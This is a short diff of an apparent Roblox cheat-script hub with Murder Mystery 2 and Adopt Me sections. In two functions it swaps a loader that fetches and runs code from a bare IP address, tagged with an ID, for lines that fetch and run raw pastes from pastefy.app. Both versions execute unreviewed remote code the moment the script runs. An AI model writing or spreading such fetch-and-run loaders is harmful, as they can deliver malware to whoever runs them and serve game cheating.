@@ -77,8 +77,7 @@ local function MurderMystery2MainScript()
 end
 
 local function S2()
-ID="30f34e94-4c6d-4bd0-b5d1-73d3bf7dc6a7";
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("https://pastefy.app/dB553paM/raw"))()
 end
 
 -- ADOPT ME
@@ -87,8 +86,7 @@ local function AdoptMeMainScript()
 end
 
 local function S4()
-ID="30f34e94-4c6d-4bd0-b5d1-73d3bf7dc6a7";
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("https://pastefy.app/t3F2bOq2/raw"))()
 end
 
 -- Get game ID
